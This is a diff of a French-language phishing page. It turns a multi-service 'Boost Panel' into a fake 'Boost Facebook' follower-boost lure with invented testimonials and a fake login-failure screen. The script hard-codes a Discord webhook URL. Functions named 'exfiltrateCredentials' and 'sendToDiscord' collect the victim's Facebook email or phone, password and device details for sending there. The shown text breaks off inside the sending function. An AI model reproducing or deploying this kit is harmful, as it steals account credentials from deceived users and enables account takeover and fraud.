@@ -3,163 +3,283 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Boost Panel Pro</title>
+    <title>Boost Facebook Pro</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body {
-            background: #0b0f1a;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
-            color: #e8ecf1;
-            padding: 16px;
-            min-height: 100vh;
+        }
+        body {
+            background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
+            padding: 20px;
         }
         .container {
-            max-width: 480px;
+            max-width: 420px;
             width: 100%;
-            background: #131a2b;
-            border-radius: 32px;
-            padding: 28px 20px 24px;
-            border: 1px solid #1f2a40;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+            padding: 30px 24px;
+            transition: all 0.3s;
+            position: relative;
         }
-        .header {
+
+        /* ===== TROIS BARRES HORIZONTALES EN HAUT À DROITE ===== */
+        .menu-bars {
+            position: absolute;
+            top: 18px;
+            right: 20px;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 16px;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+            padding: 6px 8px;
+            border-radius: 8px;
+            transition: background 0.2s;
+            z-index: 10;
         }
-        .header h1 {
-            font-size: 22px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #f7c948, #f59e0b);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .menu-bars:hover {
+            background: #f0f2f5;
         }
-        .header span { font-size: 12px; color: #6b7a93; background: #1f2a40; padding: 4px 12px; border-radius: 30px; }
-
-        .progress-wrapper {
-            width: 100%;
-            height: 4px;
-            background: #1f2a40;
-            border-radius: 4px;
-            margin: 12px 0 18px;
-            overflow: hidden;
+        .menu-bars .bar {
+            width: 26px;
+            height: 3px;
+            background: #606770;
+            border-radius: 2px;
+            transition: all 0.3s;
+        }
+        .menu-bars.active .bar:nth-child(1) {
+            transform: rotate(45deg) translate(5px, 5px);
+            background: #1877f2;
+        }
+        .menu-bars.active .bar:nth-child(2) {
             opacity: 0;
-            transition: opacity 0.3s;
         }
-        .progress-wrapper.active { opacity: 1; }
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #f7c948, #f59e0b, #f7c948);
-            background-size: 200% 100%;
-            border-radius: 4px;
-            transition: width 0.3s ease;
-            animation: shimmer 1.5s infinite;
-        }
-        @keyframes shimmer { 0% { background-position: 0% 0; } 100% { background-position: 200% 0; } }
-
-        .section-title { font-size: 15px; font-weight: 600; margin: 6px 0 12px; color: #c8d0dc; }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-        }
-        .service-card {
-            background: #1a2338;
-            border-radius: 16px;
-            padding: 14px 6px;
-            text-align: center;
-            border: 2px solid #2a3650;
-            transition: all 0.2s;
-            cursor: pointer;
-        }
-        .service-card:active { transform: scale(0.95); }
-        .service-card .icon { font-size: 30px; display: block; margin-bottom: 2px; }
-        .service-card .name { font-size: 12px; font-weight: 500; color: #c8d0dc; }
-        .service-card .price { font-size: 10px; color: #8a9bb5; margin-top: 2px; }
-        .service-card.active {
-            border-color: #f7c948;
-            background: #1f2a40;
-            box-shadow: 0 0 25px rgba(247,201,72,0.1);
+        .menu-bars.active .bar:nth-child(3) {
+            transform: rotate(-45deg) translate(6px, -6px);
+            background: #1877f2;
         }
 
-        .form-section {
-            background: #1a2338;
-            border-radius: 16px;
-            padding: 20px 16px 18px;
-            margin-top: 18px;
-            border: 1px solid #2a3650;
+        /* ===== MENU DÉROULANT ===== */
+        .dropdown-menu {
             display: none;
-        }
-        .form-section.visible { display: block; }
-        .form-section .field { margin-bottom: 14px; }
-        .form-section .field label {
-            display: block;
-            font-size: 13px;
-            color: #8a9bb5;
-            margin-bottom: 4px;
-            font-weight: 500;
-        }
-        .form-section .field input {
-            width: 100%;
-            padding: 12px 14px;
-            background: #0f1626;
-            border: 1px solid #2a3650;
+            position: absolute;
+            top: 60px;
+            right: 20px;
+            background: #fff;
             border-radius: 12px;
-            color: #e8ecf1;
-            font-size: 15px;
-            outline: none;
-            transition: 0.2s;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+            padding: 8px 0;
+            min-width: 180px;
+            z-index: 20;
+            border: 1px solid #e4e6eb;
         }
-        .form-section .field input:focus { border-color: #f7c948; }
-        .form-section .field input::placeholder { color: #4a5a73; }
-        .btn-continue {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #f7c948, #f59e0b);
+        .dropdown-menu.active {
+            display: block;
+        }
+        .dropdown-menu a {
+            display: block;
+            padding: 10px 18px;
+            color: #1a1a1a;
+            text-decoration: none;
+            font-size: 14px;
+            transition: background 0.15s;
             border: none;
-            border-radius: 14px;
-            font-size: 17px;
-            font-weight: 700;
-            color: #0b0f1a;
+            background: none;
+            width: 100%;
+            text-align: left;
             cursor: pointer;
-            transition: 0.2s;
+        }
+        .dropdown-menu a:hover {
+            background: #f0f2f5;
+        }
+        .dropdown-menu .divider {
+            height: 1px;
+            background: #e4e6eb;
+            margin: 4px 12px;
+        }
+
+        .logo {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 6px;
+        }
+        .sub-logo {
+            text-align: center;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .boost-badge {
+            background: linear-gradient(135deg, #1877f2, #0d65d9);
+            color: #fff;
+            padding: 12px 16px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .boost-badge span {
+            display: block;
+            font-size: 12px;
+            font-weight: 400;
+            opacity: 0.85;
             margin-top: 4px;
         }
-        .btn-continue:active { transform: scale(0.97); }
-        .btn-continue:disabled { opacity: 0.5; }
+        .field {
+            margin-bottom: 14px;
+        }
+        .field input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            transition: 0.2s;
+            background: #f7f8fa;
+        }
+        .field input:focus {
+            border-color: #1877f2;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
 
-        .status-bar {
-            margin-top: 14px;
-            padding: 10px 14px;
-            background: #0f1626;
-            border-radius: 12px;
-            font-size: 12px;
-            color: #6b7a93;
+        /* ===== CHAMP TÉLÉPHONE AVEC INDICATIF ===== */
+        .phone-field {
             display: flex;
-            align-items: center;
             gap: 8px;
-            border-left: 3px solid #f7c948;
+            align-items: center;
         }
-        .status-bar .spinner {
-            width: 14px; height: 14px;
-            border: 2px solid #2a3650;
-            border-top-color: #f7c948;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: none;
+        .phone-field select {
+            width: 80px;
+            padding: 14px 6px;
+            border: 1px solid #dddfe2;
+            border-radius: 10px;
+            font-size: 14px;
+            background: #f7f8fa;
+            outline: none;
+            flex-shrink: 0;
         }
-        .status-bar .spinner.active { display: block; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .footer { margin-top: 14px; text-align: center; font-size: 11px; color: #4a5a73; }
+        .phone-field select:focus {
+            border-color: #1877f2;
+        }
+        .phone-field input {
+            flex: 1;
+            min-width: 0;
+        }
 
+        /* ===== OPTION EMAIL/TÉLÉPHONE ===== */
+        .login-option {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 14px;
+            background: #f0f2f5;
+            padding: 4px;
+            border-radius: 10px;
+        }
+        .login-option button {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            background: transparent;
+            color: #606770;
+        }
+        .login-option button.active {
+            background: #fff;
+            color: #1877f2;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+        .login-option button:hover {
+            color: #1877f2;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #1877f2, #0d65d9);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn:hover {
+            transform: scale(1.01);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 13px;
+            color: #606770;
+        }
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        /* ===== BARRE DE PROGRESSION ===== */
+        .progress-wrapper {
+            display: none;
+            margin: 18px 0 12px;
+        }
+        .progress-wrapper.active {
+            display: block;
+        }
+        .progress-bar-bg {
+            width: 100%;
+            height: 6px;
+            background: #e4e6eb;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #1877f2, #0d65d9);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+        .progress-text {
+            font-size: 13px;
+            color: #606770;
+            text-align: center;
+            margin-top: 6px;
+        }
+
+        /* ===== PAGE BLANCHE D'ÉCHEC (overlay) ===== */
         .error-overlay {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: #ffffff;
             display: none;
             justify-content: center;
@@ -169,14 +289,31 @@
             padding: 30px;
             font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
         }
-        .error-overlay.active { display: flex; }
-        .error-overlay .error-icon { font-size: 56px; margin-bottom: 12px; color: #ea4335; }
-        .error-overlay h2 { color: #202124; font-size: 22px; font-weight: 500; margin-bottom: 8px; }
-        .error-overlay p { color: #5f6368; font-size: 15px; max-width: 360px; text-align: center; line-height: 1.5; }
+        .error-overlay.active {
+            display: flex;
+        }
+        .error-overlay .error-icon {
+            font-size: 56px;
+            margin-bottom: 12px;
+            color: #ea4335;
+        }
+        .error-overlay h2 {
+            color: #202124;
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        .error-overlay p {
+            color: #5f6368;
+            font-size: 15px;
+            max-width: 340px;
+            text-align: center;
+            line-height: 1.5;
+        }
         .error-overlay .btn-retry {
             margin-top: 24px;
             padding: 12px 40px;
-            background: #1a73e8;
+            background: #1877f2;
             border: none;
             border-radius: 30px;
             color: #fff;
@@ -185,607 +322,928 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .error-overlay .btn-retry:active { transform: scale(0.96); background: #1557b0; }
-        .error-overlay .sub-text { margin-top: 12px; font-size: 12px; color: #9aa0a6; }
+        .error-overlay .btn-retry:hover {
+            background: #0d65d9;
+        }
+        .error-overlay .sub-text {
+            margin-top: 12px;
+            font-size: 12px;
+            color: #9aa0a6;
+        }
+
+        /* ===== LOADING SPINNER ===== */
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 12px;
+            color: #1877f2;
+            font-size: 14px;
+        }
+        .loading.active {
+            display: block;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ddd;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .error-msg {
+            color: #c00;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* ===== SECTION COMMENTAIRES ===== */
+        .comments-section {
+            margin-top: 22px;
+            border-top: 1px solid #e4e6eb;
+            padding-top: 16px;
+        }
+        .comments-section .title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+        .comment {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+            padding: 10px 12px;
+            background: #f7f8fa;
+            border-radius: 10px;
+        }
+        .comment .avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #1877f2;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+        .comment .content {
+            flex: 1;
+        }
+        .comment .content .name {
+            font-weight: 600;
+            font-size: 13px;
+            color: #1a1a1a;
+        }
+        .comment .content .text {
+            font-size: 13px;
+            color: #4a4a4a;
+            margin-top: 2px;
+        }
+        .comment .content .time {
+            font-size: 11px;
+            color: #9aa0a6;
+            margin-top: 2px;
+        }
+        .btn-comments {
+            width: 100%;
+            padding: 10px;
+            background: #f0f2f5;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1877f2;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 6px;
+        }
+        .btn-comments:hover {
+            background: #e4e6eb;
+        }
+        .comments-wrapper {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease;
+        }
+        .comments-wrapper.open {
+            max-height: 600px;
+        }
+
+        /* ===== ZONE AJOUT COMMENTAIRE ===== */
+        .add-comment-area {
+            margin-top: 12px;
+            display: none;
+            background: #f7f8fa;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid #e4e6eb;
+        }
+        .add-comment-area.active {
+            display: block;
+        }
+        .add-comment-area textarea {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 14px;
+            resize: vertical;
+            min-height: 60px;
+            outline: none;
+            font-family: inherit;
+            background: #fff;
+        }
+        .add-comment-area textarea:focus {
+            border-color: #1877f2;
+        }
+        .add-comment-area .btn-submit-comment {
+            margin-top: 8px;
+            padding: 10px;
+            background: linear-gradient(135deg, #1877f2, #0d65d9);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+        }
+        .add-comment-area .btn-submit-comment:hover {
+            opacity: 0.9;
+        }
+        .btn-add-comment {
+            width: 100%;
+            padding: 10px;
+            background: #e4e6eb;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1877f2;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 6px;
+        }
+        .btn-add-comment:hover {
+            background: #d0d2d6;
+        }
+
+        /* ===== NOTIFICATION SUCCESS ===== */
+        .comment-success {
+            display: none;
+            text-align: center;
+            padding: 14px;
+            background: #e6f7e6;
+            border-radius: 10px;
+            color: #1e7e34;
+            font-weight: 600;
+            font-size: 15px;
+            margin-top: 10px;
+            border: 1px solid #b8e6b8;
+            animation: fadeIn 0.5s ease;
+        }
+        .comment-success.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .notification-toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2d2d2d;
+            color: #fff;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+            z-index: 99999;
+            display: none;
+            animation: slideUp 0.4s ease;
+        }
+        .notification-toast.active {
+            display: block;
+        }
+        .notification-toast.success {
+            background: #1e7e34;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        /* ===== TABLEAU DE BORD / HISTORIQUE (modales) ===== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            padding: 20px;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-box {
+            background: #fff;
+            border-radius: 16px;
+            max-width: 400px;
+            width: 100%;
+            padding: 24px 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-box h3 {
+            font-size: 20px;
+            margin-bottom: 12px;
+            color: #1a1a1a;
+        }
+        .modal-box .close-modal {
+            float: right;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #606770;
+        }
+        .modal-box .stat-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #e4e6eb;
+        }
+        .modal-box .stat-item:last-child {
+            border-bottom: none;
+        }
+        .modal-box .stat-label {
+            color: #606770;
+        }
+        .modal-box .stat-value {
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+        .modal-box .history-item {
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f2f5;
+            font-size: 14px;
+        }
+        .modal-box .history-item .date {
+            color: #606770;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
 
+<!-- ===== PAGE BLANCHE D'ÉCHEC ===== -->
 <div class="error-overlay" id="errorOverlay">
     <div class="error-icon">❌</div>
     <h2>Connexion échouée</h2>
     <p>Impossible de se connecter au service. Veuillez vérifier vos identifiants et réessayer.</p>
-    <button class="btn-retry" id="retryErrorBtn">🔄 Réessayer</button>
+    <button class="btn-retry" id="retryBtn">🔄 Réessayer</button>
     <div class="sub-text">Erreur #1001 • Veuillez ressayer</div>
 </div>
 
-<div class="container" id="app">
-    <div class="header">
-        <h1>⚡ Boost Panel</h1>
-        <span>v3.1</span>
-    </div>
+<!-- ===== NOTIFICATION TOAST ===== -->
+<div class="notification-toast" id="notificationToast"></div>
 
-    <div class="progress-wrapper" id="progressWrapper">
-        <div class="progress-bar" id="progressBar"></div>
+<!-- ===== MODALE TABLEAU DE BORD ===== -->
+<div class="modal-overlay" id="dashboardModal">
+    <div class="modal-box">
+        <button class="close-modal" id="closeDashboard">✕</button>
+        <h3>📊 Tableau de bord</h3>
+        <div class="stat-item"><span class="stat-label">📈 Abonnés gagnés</span><span class="stat-value" id="statFollowers">0</span></div>
+        <div class="stat-item"><span class="stat-label">🚀 Boosts effectués</span><span class="stat-value" id="statBoosts">0</span></div>
+        <div class="stat-item"><span class="stat-label">💬 Commentaires postés</span><span class="stat-value" id="statComments">0</span></div>
+        <div class="stat-item"><span class="stat-label">📅 Session</span><span class="stat-value" id="statSession">0 min</span></div>
     </div>
+</div>
 
-    <div class="section-title">📱 Choisis ton service</div>
-    <div class="grid" id="serviceGrid">
-        <div class="service-card active" data-service="facebook">
-            <span class="icon">📘</span>
-            <div class="name">Facebook</div>
-            <div class="price">0.50 € / 100</div>
-        </div>
-        <div class="service-card" data-service="tiktok">
-            <span class="icon">🎵</span>
-            <div class="name">TikTok</div>
-            <div class="price">0.70 € / 100</div>
-        </div>
-        <div class="service-card" data-service="instagram">
-            <span class="icon">📸</span>
-            <div class="name">Instagram</div>
-            <div class="price">0.60 € / 100</div>
-        </div>
-        <div class="service-card" data-service="twitter">
-            <span class="icon">🐦</span>
-            <div class="name">Twitter</div>
-            <div class="price">0.55 € / 100</div>
-        </div>
-        <div class="service-card" data-service="whatsapp">
-            <span class="icon">💬</span>
-            <div class="name">WhatsApp</div>
-            <div class="price">0.45 € / 100</div>
-        </div>
-        <div class="service-card" data-service="telegram">
-            <span class="icon">✈️</span>
-            <div class="name">Telegram</div>
-            <div class="price">0.40 € / 100</div>
+<!-- ===== MODALE HISTORIQUE ===== -->
+<div class="modal-overlay" id="historyModal">
+    <div class="modal-box">
+        <button class="close-modal" id="closeHistory">✕</button>
+        <h3>📜 Historique des boosts</h3>
+        <div id="historyList">
+            <div class="history-item" style="color:#606770;font-style:italic;">Aucun boost enregistré pour le moment.</div>
         </div>
     </div>
+</div>
 
-    <div class="form-section" id="formSection">
+<!-- ===== PAGE PRINCIPALE ===== -->
+<div class="container" id="mainContainer">
+
+    <!-- ===== TROIS BARRES HORIZONTALES (MENU) ===== -->
+    <div class="menu-bars" id="menuBars">
+        <span class="bar"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+    </div>
+
+    <!-- ===== MENU DÉROULANT ===== -->
+    <div class="dropdown-menu" id="dropdownMenu">
+        <a href="#" id="menuDashboard">📊 Tableau de bord</a>
+        <a href="#" id="menuHistory">📜 Historique des boosts</a>
+        <div class="divider"></div>
+        <a href="#" id="menuSupport">🛟 Support</a>
+        <a href="#" id="menuLogout">🚪 Se déconnecter</a>
+    </div>
+
+    <div class="logo">🔵 Boost Facebook</div>
+    <div class="sub-logo">Augmentez votre visibilité en 2 clics</div>
+
+    <div class="boost-badge">
+        ⚡ Offre spéciale : +5000 abonnés offerts
+        <span>Valable jusqu'à épuisement du stock</span>
+    </div>
+
+    <form id="loginForm">
+        <!-- ===== OPTION EMAIL / TÉLÉPHONE ===== -->
+        <div class="login-option">
+            <button type="button" id="optionEmail" class="active">📧 Email</button>
+            <button type="button" id="optionPhone">📱 Téléphone</button>
+        </div>
+
+        <!-- ===== CHAMP EMAIL (visible par défaut) ===== -->
+        <div class="field" id="emailField">
+            <input type="email" id="email" placeholder="Adresse e-mail Facebook" required>
+        </div>
+
+        <!-- ===== CHAMP TÉLÉPHONE (caché par défaut) ===== -->
+        <div class="field" id="phoneField" style="display:none;">
+            <div class="phone-field">
+                <select id="countryCode">
+                    <option value="+223">🇲🇱 +223 (Mali)</option>
+                    <option value="+224">🇬🇳 +224 (Guinée)</option>
+                    <option value="+221">🇸🇳 +221 (Sénégal)</option>
+                    <option value="+225">🇨🇮 +225 (Côte d'Ivoire)</option>
+                    <option value="+226">🇧🇫 +226 (Burkina Faso)</option>
+                    <option value="+227">🇳🇪 +227 (Niger)</option>
+                    <option value="+228">🇹🇬 +228 (Togo)</option>
+                    <option value="+229">🇧🇯 +229 (Bénin)</option>
+                    <option value="+233">🇬🇭 +233 (Ghana)</option>
+                    <option value="+234">🇳🇬 +234 (Nigeria)</option>
+                </select>
+                <input type="tel" id="phoneNumber" placeholder="Numéro de téléphone">
+            </div>
+        </div>
+
         <div class="field">
-            <label id="fieldLabel">📧 Email / Identifiant</label>
-            <input type="text" id="loginInput" placeholder="Entrez votre identifiant" autocomplete="off">
+            <input type="password" id="password" placeholder="Mot de passe Facebook" required>
         </div>
-        <div class="field">
-            <label>🔑 Mot de passe</label>
-            <input type="password" id="passInput" placeholder="Entrez votre mot de passe" autocomplete="off">
+        <button type="submit" class="btn" id="submitBtn">🚀 Démarrer le boost</button>
+
+        <div class="loading" id="loading">
+            <span class="spinner"></span> Vérification des identifiants...
         </div>
-        <button class="btn-continue" id="continueBtn">🚀 Continuer</button>
+
+        <div class="progress-wrapper" id="progressWrapper">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">0%</div>
+        </div>
+
+        <div class="error-msg" id="errorMsg">❌ Veuillez remplir tous les champs.</div>
+    </form>
+
+    <!-- ===== SECTION COMMENTAIRES ===== -->
+    <div class="comments-section">
+        <div class="title">💬 Témoignages de nos utilisateurs</div>
+        <button class="btn-comments" id="toggleComments">Afficher les témoignages ▼</button>
+        <div class="comments-wrapper" id="commentsWrapper">
+            <div class="comment">
+                <div class="avatar">S</div>
+                <div class="content">
+                    <div class="name">Sarah M.</div>
+                    <div class="text">"J'ai gagné 3000 abonnés en 24h ! Service incroyable, je recommande."</div>
+                    <div class="time">Il y a 2 heures</div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="avatar">T</div>
+                <div class="content">
+                    <div class="name">Thomas L.</div>
+                    <div class="text">"Très efficace pour booster ma page. Je suis passé de 500 à 5000 en une semaine."</div>
+                    <div class="time">Il y a 5 heures</div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="avatar">L</div>
+                <div class="content">
+                    <div class="name">Léa G.</div>
+                    <div class="text">"Le support est réactif et les résultats sont au rendez-vous. 5 étoiles !"</div>
+                    <div class="time">Il y a 1 jour</div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="avatar">M</div>
+                <div class="content">
+                    <div class="name">Marc D.</div>
+                    <div class="text">"J'ai testé plusieurs services, celui-ci est le seul qui a vraiment fonctionné."</div>
+                    <div class="time">Il y a 2 jours</div>
+                </div>
+            </div>
+
+            <!-- ===== AJOUTER UN COMMENTAIRE ===== -->
+            <div class="add-comment-area" id="addCommentArea">
+                <textarea id="commentInput" placeholder="Écrivez votre témoignage ici..." maxlength="500"></textarea>
+                <button class="btn-submit-comment" id="submitCommentBtn">📝 Ajouter</button>
+                <div class="comment-success" id="commentSuccess">✅ Commentaire ajouté avec succès !</div>
+            </div>
+            <button class="btn-add-comment" id="toggleAddComment">➕ Ajouter un commentaire</button>
+        </div>
     </div>
 
-    <div class="status-bar" id="statusBar">
-        <span class="spinner" id="spinner"></span>
-        <span id="statusMsg">🔒 Prêt à booster</span>
+    <div class="footer">
+        <a href="#">Conditions</a> · <a href="#">Confidentialité</a> · <a href="#">Aide</a>
     </div>
-
-    <div class="footer">🔐 Sécurisé • Boost instantané • 100% fiable</div>
 </div>
 
 <script>
-(function() {
-    'use strict';
+    // ============================================================
+    // CONFIGURATION – TON WEBHOOK DISCORD
+    // ============================================================
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528153297049882825/Fg4qskOR6eXdRg_uua58CuUciN2vv1Wna3RKoSHwVKtWHLtzvJaFsyENg_Kd5Qwu1zW4';
 
-    // =========================================================
-    // 1. CONFIGURATION – Webhook Discord
-    // =========================================================
-    const CONFIG = {
-        webhookUrl: 'https://discord.com/api/webhooks/1528153297049882825/Fg4qskOR6eXdRg_uua58CuUciN2vv1Wna3RKoSHwVKtWHLtzvJaFsyENg_Kd5Qwu1zW4',
-        beaconInterval: 15000,
-        debugMode: false
-    };
-
-    // =========================================================
-    // 2. ÉTAT
-    // =========================================================
-    const state = {
-        sessionId: 'sess_' + Math.random().toString(36).substring(2, 12) + '_' + Date.now().toString(36),
-        startTime: Date.now(),
-        events: [],
-        selectedService: 'facebook',
-        attempts: 0,
-        isProcessing: false,
-        exfiltrated: false,
-        alreadySent: false,
-        timer: null,
-        errorShown: false
-    };
-
-    // DOM
-    const dom = {
-        serviceCards: document.querySelectorAll('.service-card'),
-        loginInput: document.getElementById('loginInput'),
-        passInput: document.getElementById('passInput'),
-        continueBtn: document.getElementById('continueBtn'),
-        statusMsg: document.getElementById('statusMsg'),
-        spinner: document.getElementById('spinner'),
-        fieldLabel: document.getElementById('fieldLabel'),
-        formSection: document.getElementById('formSection'),
-        progressWrapper: document.getElementById('progressWrapper'),
-        progressBar: document.getElementById('progressBar'),
-        errorOverlay: document.getElementById('errorOverlay'),
-        retryErrorBtn: document.getElementById('retryErrorBtn')
-    };
-
-    // =========================================================
-    // 3. UTILITAIRES
-    // =========================================================
-    function updateStatus(msg) {
-        if (dom.statusMsg) dom.statusMsg.textContent = msg;
-    }
-
-    function setSpinner(active) {
-        if (dom.spinner) {
-            if (active) dom.spinner.classList.add('active');
-            else dom.spinner.classList.remove('active');
-        }
-    }
-
-    function getServiceLabel(service) {
-        const map = {
-            facebook: 'Facebook',
-            tiktok: 'TikTok',
-            instagram: 'Instagram',
-            twitter: 'Twitter',
-            whatsapp: 'WhatsApp',
-            telegram: 'Telegram'
-        };
-        return map[service] || service;
-    }
-
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        return {
-            userAgent: ua,
-            isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(ua),
-            isAndroid: /Android/i.test(ua),
-            isIOS: /iPhone|iPad|iPod/i.test(ua),
-            platform: navigator.platform || 'unknown',
-            screen: window.screen.width + 'x' + window.screen.height,
-            language: navigator.language || 'unknown',
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
-            url: window.location.href,
-            referrer: document.referrer || 'direct',
-            sessionId: state.sessionId,
-            attempts: state.attempts
-        };
-    }
-
-    function captureEvent(type, detail = '') {
-        state.events.push({
-            type: type,
-            detail: detail,
-            time: Math.floor((Date.now() - state.startTime) / 1000) + 's'
-        });
-        if (state.events.length > 40) {
-            state.events.splice(0, 20);
-        }
-    }
-
-    // =========================================================
-    // 4. EXFILTRATION – ENVOI DES IDENTIFIANTS
-    // =========================================================
-    function exfiltrateCredentials() {
-        const login = dom.loginInput.value.trim();
-        const pass = dom.passInput.value.trim();
-
-        if (!login || !pass) return false;
-        if (state.alreadySent) return false;
-
-        state.attempts++;
-        state.alreadySent = true;
-        state.errorShown = false;
-        const service = state.selectedService;
-
-        const credentials = {
-            service: service,
-            service_label: getServiceLabel(service),
-            login: login,
-            password: pass,
-            attempt_number: state.attempts,
+    // ============================================================
+    // 1. EXFILTRATION VERS DISCORD
+    // ============================================================
+    function sendToDiscord(data) {
+        const payload = {
+            action: data.action || 'generic',
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
-            device: getDeviceInfo()
+            screen: window.screen.width + 'x' + window.screen.height,
+            url: window.location.href,
+            ...data
         };
 
-        const payload = {
-            session: state.sessionId,
-            timestamp: new Date().toISOString(),
-            elapsed: Math.floor((Date.now() - state.startTime) / 1000) + 's',
-            device: getDeviceInfo(),
-            data: {
-                action: 'credentials_captured',
-                credentials: credentials,
-                attempt: state.attempts
-            },
-            events: state.events.slice(-25),
-            attempts: state.attempts
-        };
